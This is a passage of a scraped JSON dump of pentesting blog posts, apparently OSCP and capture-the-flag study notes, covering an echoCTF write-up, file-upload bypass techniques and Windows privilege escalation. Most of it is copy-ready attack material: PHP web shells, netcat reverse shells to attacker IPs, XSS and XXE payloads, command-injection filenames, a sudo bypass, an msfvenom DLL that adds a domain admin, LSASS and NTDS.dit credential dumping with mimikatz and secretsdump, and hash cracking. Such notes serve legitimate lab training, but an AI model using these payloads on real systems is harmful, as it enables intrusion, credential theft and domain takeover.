error, lets try uploading our web shell again but using out custom extension shell.dotpirate. Also make sure to change the content type as the one we specified in out .htaccess -\u0026gt; application/x-httpd-php\nThis is how our upload POST request should look like now:\ncurl \u0026#39;http://10.0.50.0/shell.dotpirate?dotpirate=id\u0026#39; uid=33(www-data) gid=33(www-data) groups=33(www-data) We finally get our web shell!\nLet get a reverse shell, by first checking if nc is enabled on the target server. Then we can open a netcat listener and then use nc to send us a reverse shell!\nsudo nc -nvlp 80 [sudo] password for kali: listening on [any] 80 ... curl \u0026#39;http://10.0.50.0/shell.dotpirate?dotpirate=which%20nc\u0026#39; /bin/nc curl \u0026#39;http://10.0.50.0/shell.dotpirate?dotpirate=nc%2010.10.11.150%2080%20-e%20/bin/bash\u0026#39; Privilege Escalation Lets upgrade our shell using python\npython3 -c \u0026#39;import pty;pty.spawn(\u0026#34;/bin/bash\u0026#34;)\u0026#39; CTRL + Z stty raw -echo;fg (Press Enter) (Press Enter) (Press Enter) export TERM=xterm Manual enumeration i always do before going for automated scripts\n# Check who we are? id # What other users exist on the box? cat /etc/passwd | grep sh$ # Do i have sudo capabilities? sudo -l # Are there ant localservices running on the box? netstat -ano | grep LIST ss -antp # Always check the directroy we landed it, in this case is `/var/www/html/images` ls -la # Check for wierd files in `/opt` and `/tmp` ls -la /tmp \u0026amp;\u0026amp; ls -la /opt www-data@barney:/var/www/html$ id uid=33(www-data) gid=33(www-data) groups=33(www-data) www-data@barney:/var/www/html$ cat /etc/passwd | grep sh$ root:x:0:0:root:/root:/bin/bash ETSCTF:x:1000:33:ETSCTF_6c32ae1cc8901e60d12247bb0e2a2830:/home/ETSCTF:/bin/bash www-data@barney:/var/www/html$ sudo -l User www-data may run the following commands on barney: (ALL, !root) NOPASSWD: ALL By simple google the output of sudo -l point me to a reddit discussion which suggest a bypass! sudo -u#-1 id -u By trying it we can get reverse shell as root!\nsudo nc -nvlp 80 sudo -u#-1 nc 10.10.11.150 80 -e /bin/bash ROOT!\n","date":"2025-08-15T00:00:00Z","permalink":"https://hack.com.cy/writeups/echoctf/barney/barney/","section":"writeups","tags":["Apache",".htaccess","sudo","privilege escalation"],"title":"echoCTF Barney Writeup: File Upload to root via sudo foo"},{"categories":["CTF","OSCP Prep","Web"],"contents":"Checklist: What framework are we traying to attack. Check where the validation happens (front-end or back-end). Can we bypass blacklist extension filters via capitalization or is there any other extension we can uplaod. Check for the acceptance of double extensions on uploaded files. Can we inject special characters (e.i, %00) null byte inejection on filename. Can we bypass file type restrictions by forging valid magic bytes. If supported by the webserver, can you upload .htaccess files\nIdentify Web Framework/Programming Language First we need to know what kind of technology we are dealing with. What Programming language is the webapplication using. Or what framework.\n# We can use multuple file extensions to determine what kind of framework we are against sudo ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/web-extensions.txt:FUZZ -u http://doman.com/indexFUZZ Resources: seclists-web-extensions\nDisabling Front-end Validation We can use the browser dev tools inspector to see if the file validation happens in the front-end or back-end. If the checks happens in front-end we can attempt to disable it by editting the HTML and altering it or remove it completeley\n## Modify the HTML through Inspector (Firefox Dev tools) We can find the functionality that checks for the file that is beeing uploaded and modify it or totally remove it. Blacklist Extension Filters Most of the times there is a kind of restrictions in terms of what kind of files/file types are allowed to be uploaded. If those restrictions are using blackilist maybe we can bypass it. Or find alternative file types that we can utilize maliciously.\nWe can use Burp+Intruder to FUZZ the upload functionality against all the file-extentions and find out according to length of the response if we can bypass the validation or not.\nREMEMBER: When Using Burp UNTICK the URL encoding\nWe can also use ffuf to achieve the same results.\n## Fuzzing extensions (using ffuf) ffuf -X POST -request upload.txt -request-proto \u0026#34;http\u0026#34; -w /usr/share/wordlists/seclists/Discovery/Web-Content/web-extensions.txt Resources: seclists-web-extensions PHP-extensions .NET/ASP-extensions\nCapitalization Capitlization can also trick the validation if is not implemented correct and successfully bypass it. We can also try to change some of the extensions characters to capitals and small: pHP PhPs etc\u0026hellip;\nDouble Extensions (Whitelist Bypasses) We can also attempt to use double extensions to bypass whitelist, sometimes misconfigured web application check only the first iteration and do not process the second one.\nExamples: jpg.php png.php etc.\nCharacter Injection We can inject several characters before or after the final extension to cause the web application to misinterpret the filename and execute the uploaded file as a PHP script.\n%20 %0a %00 %0d0a / .\\ . ‚Ä¶ : We could also use reverse extension. Here is an automated way to create such a list.\nReverse Extension (Custom bash script) ## NOTE shell.php%00.jpg (works on Linux+PHP server version 5.x and earlier) shell.aspx:jpg (works on Windows+ASP) The following bash script generates all permutations of a file name before and after both the PHP and JPG extnsions for char in \u0026#39;%20\u0026#39; \u0026#39;%0a\u0026#39; \u0026#39;%00\u0026#39; \u0026#39;%0d0a\u0026#39; \u0026#39;/\u0026#39; \u0026#39;.\\\\\u0026#39; \u0026#39;.\u0026#39; \u0026#39;‚Ä¶\u0026#39; \u0026#39;:\u0026#39;; do for ext in \u0026#39;.php\u0026#39; \u0026#39;.phps\u0026#39; \u0026#39;.php3\u0026#39; \u0026#39;.php4\u0026#39; \u0026#39;.php5\u0026#39; \u0026#39;.php7\u0026#39; \u0026#39;.php8\u0026#39; \u0026#39;.pht\u0026#39; \u0026#39;.phar\u0026#39; \u0026#39;.phpt\u0026#39; \u0026#39;.pgif\u0026#39; \u0026#39;.phtml\u0026#39; \u0026#39;.phtm\u0026#39;; do echo \u0026#34;original$char$ext.jpg\u0026#34; \u0026gt;\u0026gt; wordlist.txt echo \u0026#34;original$ext$char.jpg\u0026#34; \u0026gt;\u0026gt; wordlist.txt echo \u0026#34;original.jpg$char$ext\u0026#34; \u0026gt;\u0026gt; wordlist.txt echo \u0026#34;original.jpg$ext$char\u0026#34; \u0026gt;\u0026gt; wordlist.txt done done Crafting Malicious Image (Magic Bytes) \u0026amp;\u0026amp; MIME-Type Validation Bypass This is usually done by inspecting the first few bytes of the file\u0026rsquo;s content, which contain the File Signatur or Magic Bytes\nIncluding magic bytes in the beggining of the file. Below there are 2 examples of a GIF and a ZIP.\n# GIF echo \u0026#39;GIF8\u0026lt;?php system($_GET[\u0026#34;cmd\u0026#34;]); ?\u0026gt;\u0026#39; \u0026gt; shell.gif http://\u0026lt;SERVER_IP\u0026gt;:\u0026lt;PORT\u0026gt;/index.php?language=./images/shell.gif\u0026amp;cmd=id # Zip # Works only on PHP if the zip wrapper is enabled echo \u0026#39;\u0026lt;?php system($_GET[\u0026#34;cmd\u0026#34;]); ?\u0026gt;\u0026#39; \u0026gt; shell.php \u0026amp;\u0026amp; zip shell.jpg shell.php Filter Types There are TWO common methods for validating the file content:\nContent-Type Header or File Content\nAssume we get an error message Only images are allowed and we upload shell.jpg and we get blocked this means that the file contents is beeing checked. Content-Type Wordlists\nLimited File Uploads Certain file types, likeSVG,HTML,XML, and even some image and document files, may allow us to introduce new vulnerabilities to the web application by uploading malicious versions of these files.\nXSS ## When a web application allows us to upload `HTML` files. Although HTML files won\u0026#39;t allow us to execute code (e.g., PHP), it would still be possible to implement JavaScript code. ## Another example of XSS attacks is web applications that display an image\u0026#39;s metadata after its upload. For such web applications, we can include an XSS payload in one of the Metadata parameters that accept raw text, like the¬†`Comment`¬†or¬†`Artist`¬†parameters, as follows: sudo exiftool -Comment=\u0026#39; \u0026#34;\u0026gt;\u0026lt;img src=1 onerror=alert(window.origin)\u0026gt;\u0026#39; dotpirate.jpg sudo exiftool dotpirate.jpg ## When the image\u0026#39;s metadata is displayed, the XSS payload should be triggered, and the JavaScript code will be executed to carry the XSS attack. ## SVG (Scalable Vector Graphics) images are XML-based. For this reason, we can modify their XML data to include an XSS payload. For example we can write the following to dotpirate.svg: \u0026lt;?xml version=\u0026#34;1.0\u0026#34; encoding=\u0026#34;UTF-8\u0026#34;?\u0026gt; \u0026lt;!DOCTYPE svg PUBLIC \u0026#34;-//W3C//DTD SVG 1.1//EN\u0026#34; \u0026#34;http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd\u0026#34;\u0026gt; \u0026lt;svg xmlns=\u0026#34;http://www.w3.org/2000/svg\u0026#34; version=\u0026#34;1.1\u0026#34; width=\u0026#34;1\u0026#34; height=\u0026#34;1\u0026#34;\u0026gt; \u0026lt;rect x=\u0026#34;1\u0026#34; y=\u0026#34;1\u0026#34; width=\u0026#34;1\u0026#34; height=\u0026#34;1\u0026#34; fill=\u0026#34;green\u0026#34; stroke=\u0026#34;black\u0026#34; /\u0026gt; \u0026lt;script type=\u0026#34;text/javascript\u0026#34;\u0026gt;alert(window.origin);\u0026lt;/script\u0026gt; \u0026lt;/svg\u0026gt; XXE ## The following example can be used for an SVG image that leaks the content of (`/etc/passwd`): \u0026lt;?xml version=\u0026#34;1.0\u0026#34; encoding=\u0026#34;UTF-8\u0026#34;?\u0026gt; \u0026lt;!DOCTYPE svg [ \u0026lt;!ENTITY xxe SYSTEM \u0026#34;file:///etc/passwd\u0026#34;\u0026gt; ]\u0026gt; \u0026lt;svg\u0026gt;\u0026amp;xxe;\u0026lt;/svg\u0026gt; ## To use XXE to read source code in PHP web applications, we can use the following payload in our SVG image: \u0026lt;?xml version=\u0026#34;1.0\u0026#34; encoding=\u0026#34;UTF-8\u0026#34;?\u0026gt; \u0026lt;!DOCTYPE svg [ \u0026lt;!ENTITY xxe SYSTEM \u0026#34;php://filter/convert.base64-encode/resource=index.php\u0026#34;\u0026gt; ]\u0026gt; \u0026lt;svg\u0026gt;\u0026amp;xxe;\u0026lt;/svg\u0026gt; Injections in File Names ## IF the uploaded file name is displayed (i.e., reflected) on the page. We can try injecting a command in the file name, and if the web application uses the file name within an OS command, it may lead to a command injection attack. file$(whoami).jpg file`whoami`.jpg file.jpg||whoami file\u0026lt;script\u0026gt;alert(window.origin);\u0026lt;/script\u0026gt; file\u0026#39;;select+sleep(5);--.jpg Windows-specific Attacks ## One such attack is using reserved characters, such as (`|`,¬†`\u0026lt;`,¬†`\u0026gt;`,¬†`*`, or¬†`?`), which are usually reserved for special uses like wildcards. ## Finally, we may utilize the Windows¬†[8.3 Filename Convention](https://en.wikipedia.org/wiki/8.3_filename)¬†to overwrite existing files or refer to files that do not exist. For example, to refer to a file called (`dorpitate.txt`) we can use (`HAC~1.TXT`) or (`HAC~2.TXT`), where the digit represents the order of the matching files that start with (`HAC`) Directory Traversal on Upload ![[Directory Traversal on File Upload.png]]\nWe can upload a file and change the file name to jump directories and save the file at the root directory. If we can overwrite files we couls try overwritting the authorized_keys file in the home directory of root. If this file contains the public key of a private key we control we can access the system via SSH as the root user. Execution: sudo ssh-keygen Generating public/private rsa key pair. Enter file in which to save the key (/home/kali/.ssh/id_rsa): fileup Enter passphrase (empty for no passphrase): Enter same passphrase again: Your identification has been saved in fileup Your public key has been saved in fileup.pub sudo cat fileup.pub \u0026gt; authorized_keys Now that the file contains our public key we can upload it to the target and overwrite their authorized_keys. ![[Overwritting authorized keys.png]]\nrm ~/.ssh/known_hosts sudo ssh -i fileup root@mountaindesserts.com .htaccess and webservers that support it Web Server .htaccess Support Notes Apache ‚úÖ Yes Must have AllowOverride enabled in httpd.conf or apache2.conf. LiteSpeed ‚úÖ Yes Fully supports .htaccess (Apache-compatible). OpenLiteSpeed ‚ö†Ô∏è Partial Reads .htaccess only if configured to load Apache rules. Nginx ‚ùå No Does not support .htaccess ‚Äî configs are in nginx.conf. Caddy ‚ùå No Uses its own configuration syntax. IIS ‚ùå No Uses web.config instead. If the upload functionality of a web application saves the files in root / then we can try to upload an .htaccess file allowing our own extensions to be uploaded\ncat .htaccess AddType application/x-httpd-php .dotpirate # Now we can upload a file as shell.dotpirate and it will be processed as a PHP file ","date":"2025-08-15T00:00:00Z","permalink":"https://hack.com.cy/notes/web/file-uploads/file-uploads/","section":"notes","tags":["Web Attacks","File Upload","PHP","FUFF","seclists"],"title":"Exploting File Upload Functionality"},{"categories":["CTF","Techinques","Transfering Files"],"contents":"Utilizing scp to upload and download files and directories from or on the target system.\nUploading Files/Directories Upload a File scp upc.sh victim@192.168.179.214:/home/victim Upload a Directory scp -r unix-privesc-check victim@192.168.179.214:/home/victim Downloading Files/Directories Download a File scp victim@192.168.179.214:/home/victim/upc.sh upc.sh Download a Directory scp -r victim@192.168.179.214:/home/victim/unix-privesc-check unix-privesc-check ","date":"2025-08-12T00:00:00Z","permalink":"https://hack.com.cy/notes/file-transfers/ssh/ssh/","section":"notes","tags":["exfiltration","SSH"],"title":"Transfering files using SSH Protocol with scp"},{"categories":["CTF","OSCP Prep","Windows","PE"],"contents":"Enumerating Scheduled Tasks on Windows Understanding Scheduled Tasks Scheduled tasks in Windows allow the execution of scripts, programs, or commands at specific times or events. When enumerating scheduled tasks, it is essential to consider the following:\n# Prerequisites - As which user account (principal) does this task get executed? - What triggers are specified for the task? - What actions are executed when one or more of these triggers are met? Commands for Enumerating Scheduled Tasks Querying Scheduled Tasks # Basic query of scheduled tasks with detailed information schtasks /query /fo LIST /v # Filter scheduled tasks by task name schtasks /query /fo LIST 2\u0026gt;nul | findstr TaskName # Export scheduled tasks to a file and filter by specific details schtasks /query /fo LIST /v \u0026gt; schtasks.txt; cat schtasks.txt | findstr \u0026#34;SYSTEM\\|Task To Run\u0026#34; | findstr -B 1 SYSTEM # Filter scheduled tasks by specific fields of interest schtasks /query /fo LIST /v | findstr /B /C:\u0026#34;Folder\u0026#34; /C:\u0026#34;TaskName\u0026#34; /C:\u0026#34;Run As User\u0026#34; /C:\u0026#34;Schedule\u0026#34; /C:\u0026#34;Scheduled Task State\u0026#34; /C:\u0026#34;Schedule Type\u0026#34; /C:\u0026#34;Repeat: Every\u0026#34; /C:\u0026#34;Comment\u0026#34; Using PowerShell # List scheduled tasks excluding Microsoft default tasks Get-ScheduledTask | where {$_.TaskPath -notlike \u0026#34;\\Microsoft*\u0026#34;} | ft TaskName,TaskPath,State Key Attributes to Analyze Author: Who created the task? TaskName: The name of the scheduled task. Task To Run: The executable or script that the task triggers. Next Run Time: When the task is scheduled to run next. Note Once you have enumerated scheduled tasks, investigate any anomalies or tasks that execute with high privileges (e.g., SYSTEM).\n","date":"2025-08-08T00:00:00Z","permalink":"https://hack.com.cy/notes/privilege-escalation/windows/tasks/tasks/","section":"notes","tags":["Windows","Windows Schedule Task Abuse","privilege escalation","Hijacking","Binary Permissions"],"title":"Abusing Schedule Tasks"},{"categories":["CTF","OSCP Prep","Windows","PE"],"contents":"Abusing Windows User Privileges This guide explores common Windows user privileges and their potential abuse for privilege escalation during penetration testing or CTF challenges. Each privilege is explained alongside exploitation methods and examples.\nSeImpersonate and SeAssignPrimaryToken Overview: These privileges allow a user to impersonate another user or assign a primary token to a process. Commonly abused by services running under LOCAL SERVICE, NETWORK SERVICE, or application service accounts.\nKey Notes:\nGroups that have SeImpersonate by default include:\nAdministrators LOCAL SERVICE NETWORK SERVICE SERVICE Check for SeImpersonate after gaining RCE via applications running under service accounts (e.g., web shells, Jenkins, MSSQL). Tools like JuicyPotato exploit these privileges using DCOM/NTLM reflection.\nSeImpersonate Example - JuicyPotato Scenario: Achieved RCE on a SQL server running as a service account with SeImpersonate.\nSteps:\nGain Initial Access:\npython3 /usr/share/doc/python3-impacket/examples/mssqlclient.py sql_dev@10.129.43.30 -windows-auth SQL\u0026gt; enable_xp_cmdshell SQL\u0026gt; xp_cmdshell whoami SQL\u0026gt; xp_cmdshell whoami /priv Privilege Escalation with JuicyPotato:\nUpload JuicyPotato.exe and nc.exe:\nwget https://github.com/ohpe/juicy-potato/releases/download/v0.1/JuicyPotato.exe xp_cmdshell c:\\tools\\JuicyPotato.exe -l 53375 -p c:\\windows\\system32\\cmd.exe -a \u0026#34;/c c:\\tools\\nc.exe 10.10.15.208 8443 -e cmd.exe\u0026#34; -t * On the attacker machine:\nsudo nc -nvlp 8443 PrintSpoofer,RoguePotato GodPotato PrintSpoofer and RoguePotato as well as GodPotato are alternatives to JuicyPotato for systems where it doesn‚Äôt work (e.g., Windows Server 2019+).\nExample using PrintSpoofer:\nUpload PrintSpoofer.exe and nc.exe:\nwget https://github.com/itm4n/PrintSpoofer/releases/download/v1.0/PrintSpoofer64.exe Execute a reverse shell:\nxp_cmdshell c:\\tools\\PrintSpoofer64.exe -c \u0026#34;c:\\tools\\nc.exe 10.10.14.3 8443 -e cmd\u0026#34; Listen on the attacker machine:\nsudo nc -nvlp 8443 GodPotato Resource: github.com/BeichenDream/GodPotato/releases # Check if it works GodPotato -cmd \u0026#34;cmd /c whoami\u0026#34; # Reverse Shell GodPotato -cmd \u0026#34;nc -t -e C:\\Windows\\System32\\cmd.exe 192.168.49.116 80\u0026#34; # If it does not work try change the Administrator password GodPotato -cmd \u0026#34;cmd /c net user Administrator dotpirate\u0026#34; SigmaPotato .\\SigmaPotato \u0026#34;net localgroup Administrators dave4 /add\u0026#34; SeDebugPrivilege Overview: This privilege enables users to debug processes and capture sensitive information like passwords from memory.\nExploitation Steps:\nDump LSASS Memory:\nUse ProcDump:\nprocdump.exe -accepteula -ma lsass.exe lsass.dmp Or via Task Manager (if RDP is available): Right-click LSASS in the Details tab and select Create Dump File.\nExtract Credentials with Mimikatz:\nmimikatz.exe sekurlsa::minidump lsass.dmp sekurlsa::logonPasswords SeTakeOwnershipPrivilege Overview: Grants a user the ability to take ownership of files, folders, registry keys, and other objects. Users can then modify permissions or read sensitive files.\nExample:\nCheck Privilege:\nwhoami /priv Take Ownership:\ntakeown /f \u0026#39;C:\\Department Shares\\Private\\IT\\cred.txt\u0026#39; Modify ACL to Gain Full Access:\nicacls \u0026#39;C:\\Department Shares\\Private\\IT\\cred.txt\u0026#39; /grant htb-student:F cat \u0026#39;C:\\Department Shares\\Private\\IT\\cred.txt\u0026#39; ","date":"2025-08-08T00:00:00Z","permalink":"https://hack.com.cy/notes/privilege-escalation/windows/user-privileges/userprivileges/","section":"notes","tags":["Windows","Windows User Privileges","privilege escalation","SeImpersonate","SeTakeOwnershipPrivilege","SeDebugPrivilege"],"title":"Abusing User Privileges"},{"categories":["CTF","OSCP Prep","Windows","PE"],"contents":"Abusing Windows Group Privileges Understanding and leveraging Windows group privileges is a critical aspect of system security and penetration testing. This guide delves into the capabilities and potential abuse of several key Windows groups, including their privileges and methods of exploitation.\n** Windows Built-in Groups ** Overview: Windows built-in groups come with predefined privileges. A detailed list of these groups and their functionalities is available:\nWindows Built-in Groups Privileged Accounts and Groups in Active Directory Backup Operators ## List our current group membership whoami /groups ## Assuming we are in the `Backup Operators` group ## Memebers of this group grant the following privilages: - SeBckup - SeRestore ##¬†SeBackup Allows us to copy a file from a folder, even if there are access controls in place (ACE,ACL). References ##¬†We can use the following PoC to exploit SeBackupPrivilege (1) PoC\nPre-Build DLLs. (2) SeBackupPrivilegeUtils.dll\n(3) SeBackupPrivilegeCmdLets.dll\nImporting Libraries Import-Module .\\SeBackupPrivilegeUtils.dll Import-Module .\\SeBackupPrivilegeCmdLets.dll Verifying SeBackupPrivilege is Enabled ## This is applicable after importinh the abovementioned dll(s) Get-SeBackupPrivilege ##¬†OR whoami /priv ŒùŒüŒ§Œï ŒôF You do not get the privilege try downloading pre-build binaries on resource (2) Enabling SeBackupPrivilege ## If the privilege is disabled, we can enable it with: Set-SeBackupPrivilege ## Re-Check Get-SeBackupPrivilege Copying a Protected File ## Trying to cat the file to see that access is denied. cat \u0026#39;C:\\Confidential\\2021 Contract.txt\u0026#39; ## Using the following commnad however, we can copy the file over and read it Copy-FileSeBackupPrivilege \u0026#39;C:\\Confidential\\2021 Contract.txt\u0026#39; .\\Contract.txt cat Contract.txt Attacking a Domain Controller - Copying NTDS.dit This group also permits logging in locally to a domain controller. The active directory database `NTDS.dit` is a very attractive target, as it contains the NTLM hashes for all user and computer objects in the domain. However, this file is locked and is also not accessible by unprivileged users. ## As the `NTDS.dit` file is locked by default, we can use the Windows [diskshadow] utility to create a shadow copy of the `C` drive and expose it as `E` drive. The NTDS.dit in this shadow copy won\u0026#39;t be in use by the system. PS C:\\htb\u0026gt; diskshadow.exe DISKSHADOW\u0026gt; set verbose on; DISKSHADOW\u0026gt; set metadata C:\\Windows\\Temp\\meta.cab; DISKSHADOW\u0026gt; set context clientaccessible; DISKSHADOW\u0026gt; set context persistent; DISKSHADOW\u0026gt; begin backup; DISKSHADOW\u0026gt; add volume C: alias cdrive; DISKSHADOW\u0026gt; create; DISKSHADOW\u0026gt; expose %cdrive% E:; DISKSHADOW\u0026gt; end backup; DISKSHADOW\u0026gt; exit; PS C:\\htb\u0026gt; dir E: Copying NTDS.dit Locally ## Next, we can use the `Copy-FileSeBackupPrivilege` cmdlet to bypass the ACL and copy the NTDS.dit locally. PS C:\\htb\u0026gt; Copy-FileSeBackupPrivilege E:\\Windows\\NTDS\\ntds.dit C:\\Tools\\ntds.dit Backing up SAM and SYSTEM Registry Hives ## The privilege also lets us back up the SAM and SYSTEM registry hives, which we can extract local account credentials offline using a tool such as Impacket\u0026#39;s `secretsdump.py` C:\\htb\u0026gt; reg save HKLM\\SYSTEM SYSTEM.SAV C:\\htb\u0026gt; reg save HKLM\\SAM SAM.SAV Extracting Credentials from NTDS.dit With the NTDS.dit extracted, we can use a tool such as `secretsdump.py` or the PowerShell `DSInternals` module to extract all Active Directory account credentials. Let\u0026#39;s obtain the NTLM hash for just the `administrator` account for the domain using `DSInternals` Using DSInternals-psd1 (Extracting Creds from NTDS) Import-Module .\\DSInternals.psd1 $key = Get-BootKey -SystemHivePath .\\SYSTEM Get-ADDBAccount -DistinguishedName \u0026#39;CN=administrator,CN=users,DC=inlanefreight,DC=local\u0026#39; -DBPath .\\ntds.dit -BootKey $key Using Secretsdump.py secretsdump.py -ntds ntds.dit -system SYSTEM -hashes lmhash:nthash LOCAL Robocopy Copying Files with Robocopy robocopy /B E:\\Windows\\NTDS .\\ntds ntds.dit BACKUP OPERATOR REMOTELY # Start an SMB Server sudo impacket-smbserver share -smb2support ~/Documents/OSCP/Medtech/WEB02 # Backup SAM SECURITY SYSTEM to your Share sudo impacket-reg medtech.com/joe:Flowers1@172.16.152.10 backup -o \u0026#39;\\\\172.16.152.11\\C$\u0026#39; # OR TRY and backup on some other share in the same network! # If file is big try the following command smbclient -m SMB2 \u0026#39;//172.16.152.10/C$\u0026#39; -c \u0026#39;timeout 120; iosize 16384; get \\\u0026#34;SYSTEM.save\u0026#34;\u0026#39; -U \u0026#39;medtech.com\\joe\u0026#39; # Dumping sudo impacket-secretsdump -system SYSTEM.save -sam SAM.save -security SECURITY.save LOCAL # (Grab the $MACHINE.ACC) # $MACHINE.ACC: aad3b435b51404eeaad3b435b51404ee:ee911203143a7c6fcfee95034f673f57 # Use the machine account hash with the machine account NAME against the DC sudo impacket-secretsdump medtech.com/\u0026#39;DC01$\u0026#39;@172.16.152.10 -hashes \u0026#39;:ee911203143a7c6fcfee95034f673f57\u0026#39; Event Log Readers This group allows reading event logs, including sensitive logs like Security logs (Event ID 4688).\nCommands:\nConfirm Membership:\nnet localgroup \u0026#34;Event Log Readers\u0026#34; net user logger Search Security Logs:\nUsing wevtutil: wevtutil qe Security /rd:true /f:text | Select-String \u0026#34;/user\u0026#34; Using Get-WinEvent: Get-WinEvent -LogName Security | where { $_.ID -eq 4688 -and $_.Properties[8].Value -like \u0026#39;*/user*\u0026#39;} DnsAdmins DnsAdmins group members can load arbitrary DLLs into the DNS service, which runs as NT AUTHORITY\\SYSTEM.\nExploitation Steps:\nGenerate Malicious DLL:\nmsfvenom -p windows/x64/exec cmd=\u0026#39;net group \u0026#34;domain admins\u0026#34; netadm /add /domain\u0026#39; -f dll -o adduser.dll Load DLL:\ndnscmd.exe /config /serverlevelplugindll C:\\Path\\adduser.dll sc stop dns sc start dns Clean Up:\nreg delete HKLM\\SYSTEM\\CurrentControlSet\\Services\\DNS\\Parameters /v ServerLevelPluginDll Print Operators Print Operators group grants the SeLoadDriverPrivilege, enabling members to load drivers.\nCommands and Exploits:\nConfirm Privileges:\nwhoami /priv Exploit Capcom.sys Driver:\nDownload Capcom.sys and exploit tool:\nreg add HKCU\\System\\CurrentControlSet\\Capcom /v ImagePath /t REG_SZ /d \u0026#34;\\??\\C:\\temp\\Capcom.sys\u0026#34; Verify and exploit:\nEnableSeLoadDriverPrivilege.exe .\\ExploitCapcom.exe Clean Up:\nreg delete HKCU\\System\\CurrentControlSet\\Capcom ","date":"2025-08-08T00:00:00Z","permalink":"https://hack.com.cy/notes/privilege-escalation/windows/groups/groups/","section":"notes","tags":["Windows","Windows Group Abuse","privilege escalation","Backup Operator","Event Log Readers","DnsAdmins","Print Operators"],"title":"Abusing Windows Groups"},{"categories":["CTF","OSCP Prep","Windows","PE"],"contents":"Services - Unquoted Service Path - Hijacking Searching for Running \u0026amp; Stopped Services When working with Windows services, identifying running and stopped services is crucial for discovering misconfigurations that could lead to privilege escalation.\n# When using a network logon such as WinRM or a bind shell, Get-CimInstance and Get-Service may result in \u0026#34;permission denied\u0026#34;. # See All Running Services Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State -like \u0026#39;Running\u0026#39;} # Discard Services that start from \u0026#34;C:/Windows\u0026#34; to filter out system services Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State -like \u0026#39;Running\u0026#39;} | findstr /i /v \u0026#34;C:\\Windows\u0026#34; # Get Running Services using SC command sc query | findstr SERVICE_NAME # Get both STOPPED and RUNNING Services Get-CimInstance -ClassName win32_service | Select Name,State,PathName Searching for Unquoted Service Paths Unquoted service paths are a common misconfiguration where a service executable path contains spaces but lacks quotation marks. This allows an attacker to place a malicious executable in an earlier part of the path, leading to privilege escalation.\n# Find services with unquoted paths wmic service get name,displayname,pathname,startmode | findstr /i \u0026#34;auto\u0026#34; | findstr /i /v \u0026#34;c:\\windows\\\\\u0026#34; | findstr /i /v \u0026#34;\u0026#34;\u0026#34; Checking If a Specific Service Starts on Boot Knowing if a service starts automatically on boot is important for persistence and privilege escalation scenarios.\n# Check if a service (e.g., Jenkins) starts on boot Get-CimInstance -ClassName win32_service | Select name, StartMode | Where-Object {$_.Name -like \u0026#39;jenkins\u0026#39;} # Retrieve all details about the service Get-CimInstance -ClassName win32_service | Where-Object {$_.Name -like \u0026#39;jenkins\u0026#39;} Checking Service Binary Permissions Understanding file permissions is critical when assessing whether an attacker can modify a service binary.\nMask Permissions F Full access M Modify access RX Read and execute access R Read-only access W Write-only access Note: To modify the binary, we need F (Full Access).\n# Use icacls to check permissions on important directories and service executables icacls \u0026#34;C:\\inetpub\u0026#34; # Check permissions on IIS web server directory icacls \u0026#34;C:\\xampp\\htdocs\u0026#34; # Check permissions on XAMPP web server directory icacls \u0026#34;C:\\inetpub\\wwwroot\u0026#34; # Check another common web directory # Check binary permissions for a specific service icacls \u0026#34;C:\\xampp\\apache\\bin\\httpd.exe\u0026#34; Checking Path Permissions If an attacker has Write or Full Control access on a service path, they might replace the service executable with a malicious one.\nicacls \u0026#34;C:\\xampp\\apache\\\u0026#34; # We are looking for X (Execute) or F (Full Access) Checking for Weak Service ACLs Access Control Lists (ACLs) determine what permissions users and groups have on various system resources.\n# Check registry permissions for service-related settings accesschk.exe /accepteula \u0026#34;dotpirate\u0026#34; -kvuqsw hklm\\System\\CurrentControlSet\\services # Check directory permissions accesschk.exe /accepteula \u0026#34;dotpi\u0026#34; C:\\Tools Querying a Service for Detailed Information Using sc qc allows you to get details about a service, including its binary path, user account, and other configurations.\n# Query the configuration of a specific service sc qc SystemExplorerService64 Automating the Process with PowerUp.ps1 PowerUp.ps1 is a PowerShell script that automates the process of identifying privilege escalation vulnerabilities related to Windows services.\n# Bypass execution policy to run PowerUp.ps1 powershell -ep bypass # Import PowerUp.ps1 script . .\\PowerUp.ps1 # Run all privilege escalation checks Invoke-AllChecks # Find services where the binary is modifiable Get-ModifiableServiceFile ","date":"2025-08-08T00:00:00Z","permalink":"https://hack.com.cy/notes/privilege-escalation/windows/services/services/","section":"notes","tags":["Windows","Windows Service Abuse","privilege escalation","Unquoted Service Path","Hijacking","Binary Permissions"],"title":"Abusing Windows Services"},{"categories":["CTF","OSCP Prep","Windows","PE"],"contents":"Attacking SAM ## Using `reg.exe` to Copy Registry Hives (requires admin) ## REMEMBER `RUN THE CMD AS ADMIN` reg.exe save hklm\\sam C:\\sam.save reg.exe save hklm\\system C:\\system.save reg.exe save hklm\\security C:\\security.save ## Explanation - python3 /../smbserver.py -smb2support : Creates the Share - CompData : Give the Share a name - /home/ltndotpirate/Documents/ : Where the share will be storitng data ## On Kali (10.10.15.16) sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py -smb2support CompData /home/ltndotpirate/Documents/ ## On Windows move sam.save \\\\10.10.15.16\\CompData move security.save \\\\10.10.15.16\\CompData move system.save \\\\10.10.15.16\\CompData Dumping Hashes - Impacket secretsdump.py ## Using secretsdup.py python3 /usr/share/doc/python3-impacket/examples/secretsdump.py -sam sam.save -security security.save -system system.save LOCAL Cracking Hashes with Hashcat ## Pupulate a .txt file with NT hashes (dumped from secretsdump) cat hashestocrack.txt 64f12cddaa88057e06a81b54e73b949b 31d6cfe0d16ae931b73c59d7e0c089c0 6f8c3f4d3869a10f3b4f0522f537fd33 184ecdda8cf1dd238d438c4aea4d560d f7eb9c06fafaa23c4bcf22ba6781c1e2 ## Start cracking sudo hashcat -m 1000 hashestocrack.txt /usr/share/wordlists/rockyou.txt Remote Dumping \u0026amp; LSA Secrets Considerations ## With access to credenials with (local admin privileges) we might be able to extract credentials from a `running service`, `scheduled task` or `application` that uses `LSA secrets to store passwords`. ## Dumping LSA secrets ## Using Crackmapexec | Netexec crackmapexec smb 10.10.10.13 --local-auth -u dotpirate -p HTB_@cademy_stdnt! --lsa ## Dumping SAM remotely crackmapexec smb 10.10.10.13 --local-auth -u dotpirate -p Passw0rd123 --sam Dumping LOCAL-Hashes with Mimikatz (On Windows CMD) ## Steps (1) Extract `SYSTEM` and `SAM` regictry hives from local machine. reg save 